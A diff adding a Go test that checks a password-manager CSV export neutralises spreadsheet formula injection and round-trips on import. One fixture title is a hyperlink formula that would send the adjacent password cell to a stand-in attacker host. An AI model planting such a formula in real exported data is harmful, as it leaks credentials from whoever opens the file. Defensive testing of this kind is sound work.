@@ -2,11 +2,14 @@ package keepass
 
 import (
 	"bytes"
+	"encoding/csv"
 	"errors"
 	"os"
 	"path/filepath"
 	"strings"
 	"testing"
+
+	"github.com/tobischo/gokeepasslib/v3"
 )
 
 func TestExportCSV(t *testing.T) {
@@ -674,5 +677,99 @@ func TestExportCSVReportsWriteFailure(t *testing.T) {
 	}
 	if err := db.ExportCSV(failingWriter{}); err == nil || !strings.Contains(err.Error(), "no space left") {
 		t.Fatalf("ExportCSV = %v, want the write error", err)
+	}
+}
+
+// Fields a spreadsheet would take for a formula are exported as text, with
+// a leading single quote that the import removes again; the password and
+// TOTP columns stay byte for byte.
+func TestExportCSVNeutralizesFormulas(t *testing.T) {
+	dir := t.TempDir()
+	db, err := Create(filepath.Join(dir, "synthetic.kdbx"), "synthetic-master")
+	if err != nil {
+		t.Fatal(err)
+	}
+	work, err := db.AddGroup(db.RootGroup().UUID, "-Work")
+	if err != nil {
+		t.Fatal(err)
+	}
+	entries := []Entry{
+		{Title: `=HYPERLINK("https://evil.example/?p="&D3,"Click")`, UserName: "+15550100", Password: "=1+1",
+			URL: "@SUM(A1)", Notes: "- one\n- two", TOTP: "+JBSWY3DPEHPK3PXP"},
+		{Title: "\tTabbed", UserName: "-user", Password: "-secret", Notes: "\rcarriage return"},
+		{Title: "'=quoted already", UserName: "'plain quote", Password: "@secret", URL: "'"},
+		{Title: "''+two quotes", UserName: "plain", Password: "'=secret", Notes: "'@note"},
+	}
+	ids := make([]gokeepasslib.UUID, len(entries))
+	for i, e := range entries {
+		group := db.RootGroup().UUID
+		if i == 1 {
+			group = work
+		}
+		if ids[i], err = db.AddEntry(group, e); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := db.AddAttachment(ids[0], "=cmd.txt", []byte("synthetic")); err != nil {
+		t.Fatal(err)
+	}
+
+	var buf bytes.Buffer
+	if err := db.ExportCSV(&buf); err != nil {
+		t.Fatal(err)
+	}
+	records, err := csv.NewReader(bytes.NewReader(buf.Bytes())).ReadAll()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(records) != len(entries)+1 {
+		t.Fatalf("%d records, want %d", len(records), len(entries)+1)
+	}
+	byTitle := make(map[string]Entry, len(entries))
+	for _, e := range entries {
+		byTitle[e.Title] = e
+	}
+	for _, record := range records[1:] {
+		for col, field := range record {
+			if col != 3 && col != 6 && field != "" && strings.IndexByte(csvFormulaStart, field[0]) >= 0 {
+				t.Errorf("column %d exported as a formula: %q", col, field)
+			}
+		}
+		want, ok := byTitle[csvValue(record[1])]
+		if !ok {
+			t.Fatalf("exported title %q matches no entry", record[1])
+		}
+		if record[3] != want.Password || record[6] != want.TOTP {
+			t.Errorf("%q: password %q, TOTP %q exported, want them as they are", want.Title, record[3], record[6])
+		}
+	}
+
+	imported, err := Create(filepath.Join(dir, "imported.kdbx"), "synthetic-master")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if n, err := imported.ImportCSV(bytes.NewReader(buf.Bytes())); err != nil || n != len(entries) {
+		t.Fatalf("import: %d, %v", n, err)
+	}
+	root := imported.RootGroup()
+	got := append([]Entry(nil), root.Entries...)
+	for _, g := range root.Groups {
+		if g.Name != "-Work" {
+			t.Errorf("imported group %q, want -Work", g.Name)
+		}
+		got = append(got, g.Entries...)
+	}
+	if len(got) != len(entries) {
+		t.Fatalf("%d entries imported, want %d", len(got), len(entries))
+	}
+	for _, e := range got {
+		want, ok := byTitle[e.Title]
+		if !ok {
+			t.Errorf("imported title %q matches no entry", e.Title)
+			continue
+		}
+		if e.UserName != want.UserName || e.Password != want.Password || e.URL != want.URL || e.Notes != want.Notes || e.TOTP != want.TOTP {
+			t.Errorf("%q round trip: %+v, want %+v", want.Title, e, want)
+		}
 	}
 }
